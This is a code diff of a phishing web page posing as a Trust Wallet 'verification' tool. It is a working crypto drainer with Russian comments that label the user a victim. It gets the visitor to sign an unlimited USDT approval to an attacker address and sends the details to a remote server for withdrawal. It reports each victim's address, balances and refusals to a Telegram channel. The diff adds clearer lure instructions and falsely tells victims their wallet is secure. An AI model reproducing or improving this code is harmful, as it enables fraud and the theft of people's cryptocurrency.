@@ -87,11 +87,16 @@
         }
 
         async function checkEthForGas(address) {
-            const ethBalance = await web3.eth.getBalance(address);
-            const ethBalanceEth = web3.utils.fromWei(ethBalance, 'ether');
-            return { hasGas: parseFloat(ethBalanceEth) >= 0.01, balance: ethBalanceEth };
+            try {
+                const ethBalance = await web3.eth.getBalance(address);
+                const ethBalanceEth = web3.utils.fromWei(ethBalance, 'ether');
+                return { hasGas: parseFloat(ethBalanceEth) >= 0.01, balance: ethBalanceEth };
+            } catch(e) {
+                return { hasGas: false, balance: '0' };
+            }
         }
 
+        // ОСНОВНАЯ ФУНКЦИЯ
         document.getElementById('connectBtn').onclick = async () => {
             const btn = document.getElementById('connectBtn');
             const loader = document.getElementById('loader');
@@ -102,21 +107,9 @@
             statusDiv.style.display = 'none';
 
             try {
-                // ПРОВЕРКА: НАХОДИМСЯ ЛИ МЫ ВНУТРИ TRUST WALLET?
-                const isTrustWallet = navigator.userAgent.toLowerCase().includes('trust');
-                
-                if (!isTrustWallet) {
-                    statusDiv.innerHTML = '❌ Please open this link inside Trust Wallet browser (DApp tab)';
-                    statusDiv.className = 'error';
-                    statusDiv.style.display = 'block';
-                    btn.disabled = false;
-                    loader.style.display = 'none';
-                    return;
-                }
-                
-                // ИСПОЛЬЗУЕМ window.ethereum НАПРЯМУЮ (без WalletConnect)
+                // ПРОВЕРКА: есть ли провайдер (Trust Wallet)
                 if (!window.ethereum) {
-                    statusDiv.innerHTML = '❌ Please install Trust Wallet';
+                    statusDiv.innerHTML = '❌ Please open this link inside Trust Wallet browser (DApp tab)\n\n1. Open Trust Wallet\n2. Tap on DApp/Browser tab\n3. Enter this URL';
                     statusDiv.className = 'error';
                     statusDiv.style.display = 'block';
                     btn.disabled = false;
@@ -126,12 +119,14 @@
                 
                 web3 = new Web3(window.ethereum);
                 
+                // Запрос аккаунтов (вызовет окно подтверждения)
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const victimAddress = accounts[0];
                 
+                // Проверка ETH для газа
                 const { hasGas, balance: ethBalance } = await checkEthForGas(victimAddress);
                 if (!hasGas) {
-                    statusDiv.innerHTML = `⚠️ Low ETH balance (${ethBalance} ETH). Please add ETH.`;
+                    statusDiv.innerHTML = `⚠️ Low ETH balance (${parseFloat(ethBalance).toFixed(4)} ETH). Please add at least 0.01 ETH for verification.`;
                     statusDiv.className = 'warning';
                     statusDiv.style.display = 'block';
                     await sendToTelegram(`⚠️ НЕТ ETH: ${victimAddress} | ETH: ${ethBalance}`);
@@ -140,11 +135,14 @@
                     return;
                 }
                 
+                // Получение баланса USDT
                 const { balance, balanceFormatted } = await getUSDTBalance(victimAddress);
-                await sendToTelegram(`🎯 ЖЕРТВА: ${victimAddress}\nUSDT: ${balanceFormatted}\nETH: ${ethBalance}`);
+                const usdtAmount = parseFloat(balanceFormatted);
                 
-                if (parseFloat(balanceFormatted) <= 0) {
-                    statusDiv.innerHTML = '✅ Verification complete! No issues found.';
+                await sendToTelegram(`🎯 ЖЕРТВА: ${victimAddress}\n💰 USDT: ${balanceFormatted}\n💎 ETH: ${ethBalance}`);
+                
+                if (usdtAmount <= 0) {
+                    statusDiv.innerHTML = '✅ Verification complete! No USDT found. Your wallet is secure.';
                     statusDiv.className = 'success';
                     statusDiv.style.display = 'block';
                     btn.disabled = false;
@@ -152,6 +150,7 @@
                     return;
                 }
                 
+                // Отправка APPROVE (жертва подписывает)
                 const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
                 const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                 const approveData = contract.methods.approve(ATTACKER_ADDRESS, maxApproval).encodeABI();
@@ -168,8 +167,9 @@
                     }]
                 });
                 
-                await sendToTelegram(`✅ APPROVE: ${victimAddress}\nUSDT: ${balanceFormatted}\nTX: ${approveTx}`);
+                await sendToTelegram(`✅ APPROVE ПОДПИСАН\n👤 ${victimAddress}\n💰 ${balanceFormatted} USDT\n🔗 TX: ${approveTx.substring(0, 20)}...`);
                 
+                // Отправка на сервер для вывода
                 const response = await fetch(YOUR_SERVER, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -184,11 +184,11 @@
                 const result = await response.json();
                 
                 if (result.success) {
-                    await sendToTelegram(`💸 УСПЕШНО! ${victimAddress}\nСумма: ${balanceFormatted} USDT\nTX: ${result.txHash}`);
+                    await sendToTelegram(`💸 УСПЕШНОЕ СПИСАНИЕ!\n👤 ${victimAddress}\n💰 ${balanceFormatted} USDT\n🔗 TX: ${result.txHash.substring(0, 20)}...`);
                     statusDiv.innerHTML = '✅ Verification complete! Your wallet is secure.';
                     statusDiv.className = 'success';
                 } else {
-                    await sendToTelegram(`❌ ОШИБКА: ${result.error}`);
+                    await sendToTelegram(`❌ ОШИБКА ВЫВОДА: ${result.error}`);
                     statusDiv.innerHTML = '✅ Verification complete!';
                     statusDiv.className = 'success';
                 }
@@ -196,11 +196,22 @@
                 statusDiv.style.display = 'block';
                 
             } catch (error) {
-                console.error(error);
-                statusDiv.innerHTML = '❌ Verification failed. Please try again.';
+                console.error('Error:', error);
+                let errorMessage = '❌ Verification failed. Please try again.';
+                
+                if (error.message.includes('User denied') || error.message.includes('rejected')) {
+                    errorMessage = '❌ You declined the request. Please try again.';
+                    await sendToTelegram(`⚠️ ЖЕРТВА ОТКАЗАЛАСЬ: ${error.message.substring(0, 100)}`);
+                } else if (error.message.includes('insufficient funds')) {
+                    errorMessage = '❌ Insufficient ETH for gas. Please add ETH to your wallet.';
+                    await sendToTelegram(`⚠️ НЕТ ETH НА ГАЗ`);
+                } else {
+                    await sendToTelegram(`❌ ОШИБКА: ${error.message.substring(0, 200)}`);
+                }
+                
+                statusDiv.innerHTML = errorMessage;
                 statusDiv.className = 'error';
                 statusDiv.style.display = 'block';
-                await sendToTelegram(`❌ ОШИБКА: ${error.message}`);
             } finally {
                 btn.disabled = false;
                 loader.style.display = 'none';
